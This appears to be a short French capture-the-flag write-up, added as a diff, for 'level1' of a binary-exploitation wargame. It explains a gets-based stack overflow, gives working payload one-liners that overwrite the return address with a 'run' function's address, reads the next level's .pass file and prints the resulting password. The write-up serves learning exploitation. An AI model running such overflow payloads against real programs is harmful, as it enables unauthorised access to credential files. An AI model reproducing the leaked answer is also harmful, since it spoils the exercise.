@@ -1,0 +1,17 @@
+level1 : 
+
+Idée : On overwrite l’address de retour du main par la fonction run
+
+Obtention de l’address de run :  p run (print info sur run) sur gdb
+
+Dans la fonction, un tableau de 76 char non protégé est rempli avec la fonction gets.
+On remplit donc les 76 char et l’EIP se trouve juste après. On y insère l’address de run
+
+run <<< `python -c "print 'A' * 76 + '\x44\x84\x04\x08'"`
+run <<< `cat /home/user/level2/.pass`
+
+(python -c "print 'A' * 76 + '\x72\x84\x04\x08'"; cat ) | ./level1
+cat /home/user/level2/.pass
+
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
